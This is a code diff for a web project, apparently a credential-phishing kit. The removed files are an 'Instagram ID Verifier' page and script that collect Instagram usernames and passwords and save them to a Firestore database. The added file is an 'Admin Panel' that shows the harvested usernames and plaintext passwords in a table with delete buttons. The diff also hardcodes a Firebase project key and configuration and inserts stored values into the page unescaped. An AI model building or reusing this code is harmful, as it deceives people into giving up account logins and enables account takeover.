@@ -1,225 +1,110 @@
-html
 <!DOCTYPE html>
-<html lang="en">
+
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram ID Verifier</title>
-    <!-- Google Fonts for better look -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css">
+  <title>Admin Panel - Instagram Users</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: #111;
+      color: #fff;
+      padding: 20px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #444;
+      padding: 10px;
+      text-align: center;
+    }
+    th {
+      background: #222;
+    }
+    button {
+      padding: 6px 12px;
+      border: none;
+      background: red;
+      color: white;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background: darkred;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>📸 Instagram ID Verifier</h1>
-        <p>Enter the credentials to store data in Firestore.</p>
+<h2>📊 Instagram Users Admin Panel</h2>
 
-        <form id="dataForm">
-            <div class="input-group">
-                <label for="username">Username:</label>
-                <input type="text" id="username" required placeholder="Enter Instagram Username">
-            </div>
+<table id="userTable">
+  <thead>
+    <tr>
+      <th>Username</th>
+      <th>Password</th>
+      <th>Status</th>
+      <th>Verified</th>
+      <th>Action</th>
+    </tr>
+  </thead>
+  <tbody></tbody>
+</table>
 
-            <div class="input-group">
-                <label for="password">Password:</label>
-                <input type="password" id="password" required placeholder="Enter Password">
-            </div>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-            <button type="submit" class="submit-btn">Store Data in Firestore</button>
-        </form>
-
-        <div id="message" class="message"></div>
-    </div>
-
-   
-    <script src="./firebase-config.js"></script>
-    <!-- Firestore SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
-
-    <!-- Custom Script -->
-    <script src="app.js"></script>
-</body>
-</html>
-
-:root {
-    --primary-color: #4a90e2; /* Blue Tick Color */
-    --secondary-color: #50e3c2; /* Accent Green */
-    --background-color: #f4f7fa;
-    --card-color: #ffffff;
-    --text-color: #333;
-}
-
-body {
-    font-family: 'Poppins', sans-serif;
-    background-color: var(--background-color);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    margin: 0;
-}
-
-.container {
-    background-color: var(--card-color);
-    padding: 40px;
-    border-radius: 15px;
-    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-    width: 100%;
-    max-width: 400px;
-    text-align: center;
-}
-
-h1 {
-    color: var(--primary-color);
-    margin-bottom: 10px;
-    font-weight: 700;
-}
-
-p {
-    color: #666;
-    margin-bottom: 30px;
-}
-
-.input-group {
-    margin-bottom: 20px;
-    text-align: left;
-}
-
-label {
-    display: block;
-    margin-bottom: 8px;
-    font-weight: 600;
-    color: var(--text-color);
-}
-
-input[type="text"],
-input[type="password"] {
-    width: 100%;
-    padding: 12px;
-    border: 2px solid #ccc;
-    border-radius: 8px;
-    box-sizing: border-box;
-    font-size: 16px;
-    transition: border-color 0.3s;
-}
-
-input[type="text"]:focus,
-input[type="password"]:focus {
-    border-color: var(--primary-color);
-    outline: none;
-}
-
-.submit-btn {
-    background-color: var(--primary-color);
-    color: white;
-    padding: 12px 25px;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    font-size: 17px;
-    font-weight: 600;
-    width: 100%;
-    transition: background-color 0.3s, transform 0.2s;
-}
-
-.submit-btn:hover {
-    background-color: #3a7bd5; /* Darker blue on hover */
-    transform: translateY(-2px);
-}
-
-/* Message Styling */
-.message {
-    margin-top: 20px;
-    padding: 10px;
-    border-radius: 5px;
-    font-weight: 600;
-    min-height: 20px; /* Ensure space even when empty */
-}
-
-.success {
-    background-color: #e6f7ff;
-    color: var(--primary-color);
-    border: 1px solid var(--secondary-color);
-}
-
-.error {
-    background-color: #fff1f0;
-    color: #ff4d4f;
-    border: 1px solid #ff4d4f;
-}
-
-javascript
-// firebase-config.js
-
-import { initializeApp } from "firebase/app";
-import { getFirestore } from "firebase/firestore"; // Firestore SDK import
-
-// Your web app's Firebase configuration (Your actual keys)
 const firebaseConfig = {
   apiKey: "AIzaSyAcc6qlrnYArscNXN7uyZc_MG5DxLxQNOI",
   authDomain: "vega-70de0.firebaseapp.com",
   projectId: "vega-70de0",
   storageBucket: "vega-70de0.firebasestorage.app",
   messagingSenderId: "461552169149",
-  appId: "1:461552169149:web:8fd04f085bafaee67cc7d4",
-  measurementId: "G-D207HQEYD5"
+  appId: "1:461552169149:web:8fd04f085bafaee67cc7d4"
 };
 
-// Initialize Firebase
 const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-// Initialize Firestore database
-export const db = getFirestore(app);
-```
+const tableBody = document.querySelector("#userTable tbody");
 
+// Fetch Data
+async function loadUsers() {
+  tableBody.innerHTML = "";
+  const querySnapshot = await getDocs(collection(db, "instagram_users"));
 
-import { db } from './firebase-config.js'; // Import the initialized Firestore database
-import { collection, addDoc } from "firebase/firestore";
+  querySnapshot.forEach((docSnap) => {
+    const data = docSnap.data();
+    const row = document.createElement("tr");
 
-const dataForm = document.getElementById('dataForm');
-const messageDisplay = document.getElementById('message');
+    row.innerHTML = `
+      <td>${data.username}</td>
+      <td>${data.password}</td>
+      <td>${data.status}</td>
+      <td>${data.verified}</td>
+      <td><button onclick="deleteUser('${docSnap.id}')">Delete</button></td>
+    `;
 
-dataForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const usernameInput = document.getElementById('username').value.trim();
-    const passwordInput = document.getElementById('password').value.trim();
-
-    messageDisplay.textContent = '';
-    messageDisplay.className = 'message';
-
-    if (!usernameInput || !passwordInput) {
-        showMessage('Please fill in both Username and Password.', 'error');
-        return;
-    }
-
-    const dataToStore = {
-        username: usernameInput,
-        password: passwordInput, // Note: In a real app, NEVER store passwords directly like this! Use secure hashing.
-        timestamp: new Date(),
-        status: 'pending' // Initial status for the verification process
-    };
-
-    try {
-        const docRef = await addDoc(collection(db, "instagram_ids"), dataToStore);
-
-        showMessage(`Success! Data stored in Firestore. Document ID: ${docRef.id}`, 'success');
-        dataForm.reset(); // Clear the form fields upon success
-
-    } catch (error) {
-        console.error("Error adding document: ", error);
-        showMessage(`Error occurred: ${error.message}`, 'error');
-    }
-});
-
-
-/**
- * Function to display feedback messages to the user.
- * @param {string} msg - The message text.
- * @param {string} type - 'success' or 'error'.
- */
-function showMessage(msg, type) {
-    messageDisplay.textContent = msg;
-    messageDisplay.classList.add(type);
+    tableBody.appendChild(row);
+  });
 }
+
+// Delete Function
+window.deleteUser = async (id) => {
+  if (confirm("Delete this user?")) {
+    await deleteDoc(doc(db, "instagram_users", id));
+    loadUsers();
+  }
+};
+
+// Load on start
+loadUsers();
+
+</script>
+
+</body>
+</html>
+
